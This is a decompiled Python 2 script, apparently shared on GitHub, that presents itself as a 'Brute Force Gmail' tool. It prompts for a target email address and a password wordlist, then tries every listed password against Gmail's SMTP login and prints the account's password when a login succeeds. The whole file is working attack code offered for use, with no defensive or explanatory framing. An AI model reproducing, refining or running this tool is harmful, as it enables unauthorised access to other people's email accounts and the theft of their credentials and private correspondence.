# Decompiled At :  Tue Mar 17 15:48:03 2020
# Decompiled from: Python 2.7.17 (default, Oct 23 2019, 08:25:46) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
import smtplib, time, sys, os, requests
from os import system
system('clear')
W = '\x1b[0m'
r = '\x1b[31;1m'
y = '\x1b[33;1m'
b = '\x1b[34;1m'
c = '\x1b[36;1m'
g = '\x1b[32;1m'

def asw():
    mmk(r + ('____        _    _   __        _    _____ ').center(44))
    mmk(r + ('| __ )  ___ | |_ | | / / _____ | |_ |  __ \\ ').center(44))
    mmk(y + ('|  _ \\ / _ \\|  _|| |/ / |  _  ||  _|| |  \\ \\ ').center(44))
    mmk(y + ('| |_) | (_) | |_ |  _ \\ | | | || |_ | |__/ / ').center(44))
    mmk(g + ('|____/ \\___/ \\__||_| \\_\\|_| |_|\\___||_____/ ').center(44))
    mmq(g + '=' * 45)
    mmk(c + 'Author  : Al2VyN ')
    mmk(c + 'Type    : Brute Force Gmail ')
    mmk(c + 'Github  : Https://github.com/Al2VyN')
    mmk(c + 'Version : 1.0 ')
    mmq(W + '-' * 45)


def wl():
    os.system('nano password.txt')


def ex():
    print W + ''
    exit()


def mmk(s):
    for i in s + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.001)


def mmq(s):
    for i in s + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(1e-43)


def main():
    asw()
    print y + '1.' + g + ' Brute Gmail'
    print y + '2.' + g + ' Create Password list'
    print y + '0. ' + g + 'exit\n'
    kntd = raw_input(c + '@AutismPeople ' + r + ': ' + g)
    if kntd == '1':
        login()
    elif kntd == '2':
        wl()
    elif kntd == '0':
        print r + 'Ah She Up'
        system('clear')
        ex()
    else:
        if kntd == '':
            print r + 'Input Chose'
            return main()
        aska()


def login():
    system('clear')
    asw()
    try:
        print r + ('[!] \x1b[33;1mMake sure the target email address is correct \x1b[31;1m[!]').center(44)
        print b + ('[ DATA ]').center(44)
        user_name = raw_input(g + 'Target email  : ' + c)
        ppq = user_name
        if ppq == '':
            print r + '[!] Input Email'
            time.sleep(1)
            login()
        ktl = raw_input(g + 'Password List : ' + c)
        mmq(W + '-' * 45)
        try:
            requests.post('https://google.com')
            pass_file = open(ktl, 'r')
            pass_list = pass_file.readlines()
            i = 0
            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            server.ehlo()
            mmk(y + 'Crack With ' + str(len(pass_list)) + ' password :')
            for password in pass_list:
                i = i + 1
                try:
                    kantal = server.login(user_name, password)
                    if kantal:
                        mmq(W + '-' * 45)
                        mmk(b + ('[ SUCCESS ]').center(44))
                        mmk(g + '[-] Username : ' + c + user_name)
                        mmk(g + '[-] Password : ' + c + password)
                        mmq(W + '-' * 45)
                        break
                    else:
                        mmq(g + str(i) + r + password + y + '  - Not Found,Try Again -' + W)
                        time.sleep(1e-43)
                except smtplib.SMTPAuthenticationError as e:
                    error = str(e)
                    if error[14] == '<':
                        mmq(W + '-' * 45)
                        mmk(b + ('[ SUCCESS ]').center(44))
                        mmk(g + '[-] Username : ' + c + user_name)
                        mmk(g + '[-] Password : ' + c + password)
                        mmq(W + '-' * 45)
                    else:
                        mmq(g + str(i) + '. ' + r + password + y + '  - Not Found,Try Again -' + W)
                        time.sleep(1e-43)
                except KeyboardInterrupt:
                    print '[!] Stopped'
                    time.sleep(1)
                    main()
                except requests.exceptions.ConnectionError:
                    print r + '[!] Connection Error'
                    time.sleep(1)
                    ex()

        except KeyboardInterrupt:
            print '[!] Stopped'
            time.sleep(1)
            main()
        except requests.exceptions.ConnectionError:
            print r + '[!] Connection Error'
            time.sleep(1)
            ex()

    except KeyboardInterrupt:
        print '[!] Stopped'
        time.sleep(1)
        main()
    except requests.exceptions.ConnectionError:
        print r + '[!] Connection Error'
        time.sleep(1)
        ex()
    except IOError:
        print r + '[!] File Not Found'
        time.sleep(2)
        login()


main()